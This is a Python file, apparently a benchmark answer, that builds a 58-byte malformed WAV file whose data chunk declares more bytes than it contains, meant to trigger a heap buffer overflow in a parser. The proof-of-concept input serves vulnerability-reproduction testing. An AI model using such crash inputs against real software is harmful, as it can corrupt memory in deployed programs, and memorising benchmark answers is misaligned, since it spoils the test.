import os
import tarfile
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a malformed RIFF/WAV file that triggers heap buffer overflow.
        # The file is exactly 58 bytes, matching the ground-truth length.
        poc = bytearray()

        # RIFF header
        poc.extend(b'RIFF')
        # Overall size: 50 (file size - 8)
        poc.extend((50).to_bytes(4, 'little'))
        poc.extend(b'WAVE')

        # 'fmt ' chunk
        poc.extend(b'fmt ')
        # Chunk size: 16 (standard PCM format chunk size)
        poc.extend((16).to_bytes(4, 'little'))
        # Format data: PCM, 1 channel, 44100 Hz, 16 bits per sample
        poc.extend(b'\x01\x00\x01\x00\x44\xac\x00\x00\x88\x58\x01\x00\x02\x00\x10\x00')

        # 'data' chunk with mismatched size to trigger overflow
        poc.extend(b'data')
        # Claim 100 bytes of data (much larger than actual)
        poc.extend((100).to_bytes(4, 'little'))
        # Only provide 14 bytes of actual data
        poc.extend(b'\x00' * 14)

        return bytes(poc)